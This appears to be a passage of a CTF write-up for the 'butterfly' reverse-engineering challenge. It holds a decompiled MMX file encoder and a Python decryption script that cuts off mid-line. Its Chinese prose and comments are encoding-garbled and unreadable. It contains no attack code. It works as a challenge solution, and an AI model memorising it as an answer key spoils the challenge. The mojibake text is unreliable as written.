        <content type="html"><![CDATA[<p>è™½ç„¶é€†å‘å¤§å¤±è´¥äº†ä½†æ˜¯çœŸæ‰“çˆ½äº†ï¼Œå†³å®šå…¨å¤ç°</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="butterfly"><a href="#butterfly" class="headerlink" title="butterfly"></a>butterfly</h2><p>ç¨‹åºå¯¹è¾“å…¥æ–‡ä»¶æŒ‰<strong>æ¯ 8 å­—èŠ‚å—</strong>è¿›è¡Œå¦‚ä¸‹å˜æ¢ï¼ˆåŠ å¯†æµç¨‹ï¼‰ï¼š</p><ol><li><code>t = B XOR K</code> ï¼ˆæŒ‰ä½å¼‚æˆ–ï¼ŒB ä¸º 8 å­—èŠ‚æ˜æ–‡å—ï¼Œï¼škeyä¸º <code>&quot;MMXEncode2024&quot;</code> ï¼‰</li><li><code>u = swap16(t)</code>ï¼ˆåœ¨æ¯ä¸ª 16-bit lane å†…äº¤æ¢å­—èŠ‚ï¼š<code>[b0 b1 b2 b3 ...] -&gt; [b1 b0 b3 b2 ...]</code>ï¼‰</li><li><code>v = ROL64(u, 1)</code>ï¼ˆå¯¹æ•´ä¸ª 64-bit åšå¾ªç¯å·¦ç§» 1 ä½ï¼‰</li><li><code>out = bytewise_add(v, K)</code>ï¼ˆå¯¹æ¯ä¸ªå­—èŠ‚åš <code>(v_byte + K_byte) &amp; 0xFF</code>ï¼‰</li></ol><p>å†™å›å¹¶å¯¹æ•´ä¸ªæ–‡ä»¶çš„æ¯ä¸ª 8 å­—èŠ‚å—é‡å¤æ­¤æ“ä½œã€‚ç¨‹åºè¿˜åœ¨å†…å­˜ä¸­äº <code>buf[file_size]</code> å†™å…¥ä¸€ä¸ª 16-bit çš„ <code>file_size</code>ï¼ˆåŸå§‹é•¿åº¦ï¼‰ã€‚</p><p>å› æ­¤è§£å¯†ï¼ˆé€†æ“ä½œï¼‰ä¸ºï¼š</p><ol><li><code>tmp = bytewise_sub(C, K)</code></li><li><code>rot = ROR64(tmp, 1)</code></li><li><code>swapped = swap16(rot)</code></li><li><code>B = swapped XOR K</code><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *input_filename_1; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *output_filename; <span class="comment">// r13</span></span><br><span class="line">  __int64 input_filename_2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> *input_filename; <span class="comment">// r12</span></span><br><span class="line">  __int64 file_size; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 input_file; <span class="comment">// rax</span></span><br><span class="line">  __m64 *output_file; <span class="comment">// rbp</span></span><br><span class="line">  __int64 file_size_1; <span class="comment">// r15</span></span><br><span class="line">  __m64 *input_file_2; <span class="comment">// rax</span></span><br><span class="line">  __m64 file_handle; <span class="comment">// mm0</span></span><br><span class="line">  __m64 ___file_handle___16_bit_lanes____________; <span class="comment">// mm2</span></span><br><span class="line">  _OWORD key_file[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-158h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> format_arg3[<span class="number">2</span>]; <span class="comment">// [rsp+20h] [rbp-138h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( argc != <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="number">2</span>, (__int64)<span class="string">&quot;Usage: %s &lt;input_file&gt; &lt;output_file&gt;\n&quot;</span>, *argv);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="number">2</span>, (__int64)<span class="string">&quot;Example: %s plaintext.txt encoded.dat\n&quot;</span>, *argv);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  input_filename_1 = argv[<span class="number">1</span>];</span><br><span class="line">  output_filename = argv[<span class="number">2</span>];</span><br><span class="line">  input_filename_2 = <span class="built_in">fopen</span>(input_filename_1, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  input_filename = (<span class="type">int</span> *)input_filename_2;</span><br><span class="line">  <span class="keyword">if</span> ( !input_filename_2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="number">2</span>, (__int64)<span class="string">&quot;Error: Cannot open file %s\n&quot;</span>, input_filename_1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">fseek</span>(input_filename_2, <span class="number">0LL</span>, <span class="number">2LL</span>);</span><br><span class="line">  file_size = <span class="built_in">ftell</span>(input_filename);</span><br><span class="line">  <span class="built_in">fseek</span>(input_filename, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  input_file = <span class="built_in">malloc</span>(file_size + <span class="number">8</span>);</span><br><span class="line">  output_file = (__m64 *)input_file;</span><br><span class="line">  <span class="keyword">if</span> ( !input_file )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fclose</span>(input_filename);</span><br><span class="line">    <span class="built_in">printf_0</span>(<span class="string">&quot;Error: Memory allocation failed&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  file_size_1 = <span class="built_in">fread</span>(input_file, file_size + <span class="number">8</span>, <span class="number">1LL</span>, file_size, input_filename);<span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// // fread(buf,1,file_size,f)</span></span><br><span class="line">  <span class="built_in">fclose</span>(input_filename);</span><br><span class="line">  <span class="keyword">if</span> ( file_size != file_size_1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((__int64)output_file);</span><br><span class="line">    <span class="built_in">printf_0</span>(<span class="string">&quot;Error: File read failed&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(__int16 *)((<span class="type">char</span> *)output_file-&gt;m64_i16 + file_size) = file_size;<span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// æŠŠ file_size çš„ä½ 16 ä½å†™å…¥ buf[file_size]ï¼ˆå†™ä¸¤ä¸ªå­—èŠ‚ï¼‰</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  key_file[<span class="number">0</span>] = _mm_loadu_si128((<span class="type">const</span> __m128i *)<span class="string">&quot;MMXEncode2024&quot;</span>);</span><br><span class="line">  key_file[<span class="number">1</span>] = _mm_loadu_si128((<span class="type">const</span> __m128i *)<span class="string">&quot;coding file: %s\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="number">2</span>, (__int64)<span class="string">&quot;Encoding file: %s\n&quot;</span>, input_filename_1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="number">2</span>, (__int64)<span class="string">&quot;Original size: %zu bytes\n&quot;</span>, file_size);</span><br><span class="line">  *(_QWORD *)format_arg3 = *(_QWORD *)&amp;key_file[<span class="number">0</span>];<span class="comment">// å‰ 8 å­—èŠ‚</span></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)file_size &gt; <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    input_file_2 = output_file;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      file_handle = _m_pxor((__m64)input_file_2-&gt;m64_u64, *(__m64 *)format_arg3);<span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// _m_pxor(a,b)ï¼šæŒ‰ä½ XORï¼ˆ64-bitï¼‰</span></span><br><span class="line">      ___file_handle___16_bit_lanes____________ = _m_por(_m_psrlwi(file_handle, <span class="number">8u</span>), _m_psllwi(file_handle, <span class="number">8u</span>));<span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// æŠŠ file_handle åœ¨ 16-bit lanes å†…åšâ€œå­—èŠ‚äº¤æ¢â€åçš„ç»“æœ</span></span><br><span class="line">                                                <span class="comment">// ï¼ˆç­‰ä»·äº swap bytes in each 16-bit wordï¼‰</span></span><br><span class="line">      input_file_2-&gt;m64_u64 = (<span class="type">unsigned</span> __int64)_m_paddb(</span><br><span class="line">                                                  _m_por(</span><br><span class="line">                                                    _m_psllqi(___file_handle___16_bit_lanes____________, <span class="number">1u</span>),</span><br><span class="line">                                                    _m_psrlqi(___file_handle___16_bit_lanes____________, <span class="number">0x3Fu</span>)),</span><br><span class="line">                                                  *(__m64 *)format_arg3);<span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// å¯¹æ•´ä¸ª 64-bit quadword åšå·¦ç§» 1 (logical) </span></span><br><span class="line">                                                <span class="comment">// å’Œå³ç§» 63 (logical)ï¼Œç„¶å OR</span></span><br><span class="line">                                                <span class="comment">// å†…éƒ¨ç­‰ä»·å¯¹ 64-bit å€¼åšå¾ªç¯å·¦ç§» 1 bit</span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// æŒ‰å­—èŠ‚åŠ </span></span><br><span class="line">                                                <span class="comment">// , å³å¯¹æ¯ä¸ªå­—èŠ‚ä¸ key çš„å¯¹åº”å­—èŠ‚åš (value_byte + key_byte) &amp; 0xFF</span></span><br><span class="line">      <span class="keyword">if</span> ( &amp;output_file[(<span class="type">unsigned</span> <span class="type">int</span>)(file_size - <span class="number">1</span>) &gt;&gt; <span class="number">3</span>] == input_file_2 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ++input_file_2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( &amp;output_file[((<span class="type">unsigned</span> <span class="type">int</span>)(file_size - <span class="number">8</span>) &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>] != input_file_2 );<span class="comment">// è¦†ç›–åŸæ•°æ®</span></span><br><span class="line">  &#125;</span><br><span class="line">  _m_empty();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">maybe_fwrite</span>(output_filename, output_file, file_size) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="number">2</span>, (__int64)<span class="string">&quot;Successfully encoded to: %s\n&quot;</span>, output_filename);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="number">2</span>, (__int64)<span class="string">&quot;Encoded size: %zu bytes\n&quot;</span>, file_size);</span><br><span class="line">    <span class="built_in">may_sprintf</span>((__int64)format_arg3, <span class="number">0x100uLL</span>, <span class="number">2</span>, <span class="number">0x100uLL</span>, (__int64)<span class="string">&quot;%s.key&quot;</span>, output_filename);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">maybe_fwrite</span>((<span class="type">const</span> <span class="type">char</span> *)format_arg3, (__m64 *)key_file, <span class="number">32LL</span>) )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="number">2</span>, (__int64)<span class="string">&quot;Key saved to: %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)format_arg3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>((__int64)output_file);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">ENC_PATH = Path(<span class="string">r&quot;D:\LeStoreDownload\webpage\CTF\2025 1018-1019 å¼ºç½‘æ¯\butterfly\encode.dat&quot;</span>)</span><br><span class="line">KEY_PATH = Path(<span class="string">r&quot;D:\LeStoreDownload\webpage\CTF\2025 1018-1019 å¼ºç½‘æ¯\butterfly\encode.dat.key&quot;</span>)</span><br><span class="line">OUT_PATH = Path(<span class="string">r&quot;D:\LeStoreDownload\webpage\CTF\2025 1018-1019 å¼ºç½‘æ¯\butterfly\decrypted_output.bin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ror64</span>(<span class="params">x: <span class="built_in">int</span>, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> ((x &gt;&gt; n) | ((x &lt;&lt; (<span class="number">64</span> - n)) &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span>))) &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">swap16_bytes</span>(<span class="params">b: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    out = <span class="built_in">bytearray</span>(<span class="built_in">len</span>(b))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(b), <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> i+<span class="number">1</span> &lt; <span class="built_in">len</span>(b):</span><br><span class="line">            out[i]   = b[i+<span class="number">1</span>]</span><br><span class="line">            out[i+<span class="number">1</span>] = b[i]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            out[i] = b[i]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_bytes</span>(<span class="params">a: <span class="built_in">bytes</span>, b: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_bytes</span>(<span class="params">a: <span class="built_in">bytes</span>, b: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([(x - y) &amp; <span class="number">0xFF</span> <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_block</span>(<span class="params">cipher_block: <span class="built_in">bytes</span>, key8: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(cipher_block) != <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;decrypt_block requires 8-byte block&quot;</span>)</span><br><span class="line">    tmp = sub_bytes(cipher_block, key8)</span><br><span class="line">    val = <span class="built_in">int</span>.from_bytes(tmp, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    val = ror64(val, <span class="number">1</span>)</span><br><span class="line">    rot_bytes = val.to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    swapped = swap16_bytes(rot_bytes)</span><br><span class="line">    orig = xor_bytes(swapped, key8)</span><br><span class="line">    <span class="keyword">return</span> orig</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">derive_key8_from_str</span>(<span class="params">key_str: <span class="built_in">str</span>, mode: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    kb = key_str.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    mode = mode.lower()</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">&#x27;raw8&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> (kb + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">8</span>)[:<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">&#x27;xorfold&#x27;</span>:</span><br><span class="line">        acc = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">        <span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(kb):</span><br><span class="line">            acc[i % <span class="number">8</span>] ^= v</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(acc)</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">&#x27;sumfold&#x27;</span>:</span><br><span class="line">        acc = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">        <span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(kb):</span><br><span class="line">            acc[i % <span class="number">8</span>] = (acc[i % <span class="number">8</span>] + v) &amp; <span class="number">0xFF</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(acc)</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">&#x27;md5&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> hashlib.md5(kb).digest()[:<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&#x27;unsupported key mode: &#x27;</span> + mode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">COMMON_MAGIC_PREFIXES = (</span><br><span class="line">    <span class="string">b&#x27;PK\x03\x04&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;\x89PNG\r\n\x1a\n&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;GIF87a&#x27;</span>, <span class="string">b&#x27;GIF89a&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;MZ&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;ELF&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;7z\xBC\xAF\x27\x1C&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;BM&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;\xFF\xD8\xFF&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;ID3&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;%PDF-&#x27;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">looks_plausible</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">    head = data[:<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">for</span> mg <span class="keyword">in</span> COMMON_MAGIC_PREFIXES:</span><br><span class="line">        <span class="keyword">if</span> head.startswith(mg):</span><br><span class="line">            <span class="keyword">return</span> (<span class="number">0</span>, <span class="number">0</span>) </span><br><span class="line">    sample = data[:<span class="number">64</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> sample:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">2</span>, <span class="number">1.0</span>)</span><br><span class="line">    printable = <span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> c <span class="keyword">in</span> sample <span class="keyword">if</span> <span class="number">32</span> &lt;= c &lt;= <span class="number">126</span> <span class="keyword">or</span> c <span class="keyword">in</span> (<span class="number">9</span>, <span class="number">10</span>, <span class="number">13</span>))</span><br><span class="line">    ratio = <span class="number">1.0</span> - (printable / <span class="built_in">len</span>(sample))</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">1</span>, ratio)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Load encode.dat</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> ENC_PATH.exists():</span><br><span class="line">    <span class="keyword">raise</span> FileNotFoundError(<span class="string">f&quot;<span class="subst">&#123;ENC_PATH&#125;</span> not found. Make sure the file was uploaded.&quot;</span>)</span><br><span class="line"></span><br><span class="line">enc_data = ENC_PATH.read_bytes()</span><br><span class="line"></span><br><span class="line">key_text = <span class="string">&quot;MMXEncode2024&quot;</span></span><br><span class="line"></span><br><span class="line">footer_len = <span class="literal">None</span></span><br><span class="line">orig_size = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(enc_data) &gt;= <span class="number">8</span>:</span><br><span class="line">    tail8 = <span class="built_in">int</span>.from_bytes(enc_data[-<span class="number">8</span>:], <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    max_cipher = <span class="built_in">len</span>(enc_data) - <span class="number">8</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt; tail8 &lt;= max_cipher:</span><br><span class="line">        footer_len = <span class="number">8</span></span><br><span class="line">        orig_size = tail8</span><br><span class="line"><span class="keyword">if</span> footer_len <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> <span class="built_in">len</span>(enc_data) &gt;= <span class="number">4</span>:</span><br><span class="line">    tail4 = <span class="built_in">int</span>.from_bytes(enc_data[-<span class="number">4</span>:], <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    max_cipher = <span class="built_in">len</span>(enc_data) - <span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt; tail4 &lt;= max_cipher:</span><br><span class="line">        footer_len = <span class="number">4</span></span><br><span class="line">        orig_size = tail4</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> footer_len <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="comment"># Fallback: no valid footer detected; treat whole file as cipher and use its length</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!] æœªæ£€æµ‹åˆ°æœ‰æ•ˆçš„å°¾éƒ¨åŸå§‹å¤§å°ï¼Œå›é€€ä¸ºæ•´æ–‡ä»¶è§£å¯†å¹¶ä¸æˆªæ–­ã€‚&quot;</span>)</span><br><span class="line">    cipher_data = enc_data</span><br><span class="line">    orig_size = <span class="built_in">len</span>(enc_data)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    cipher_data = enc_data[:-footer_len]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] æ£€æµ‹åˆ°å°¾éƒ¨ <span class="subst">&#123;footer_len&#125;</span> å­—èŠ‚åŸå§‹å¤§å°: <span class="subst">&#123;orig_size&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">modes = [<span class="string">&#x27;raw8&#x27;</span>, <span class="string">&#x27;xorfold&#x27;</span>, <span class="string">&#x27;sumfold&#x27;</span>, <span class="string">&#x27;md5&#x27;</span>]</span><br><span class="line">candidates = []</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> modes:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key8 = derive_key8_from_str(key_text, m)</span><br><span class="line">        dec = <span class="built_in">bytearray</span>(<span 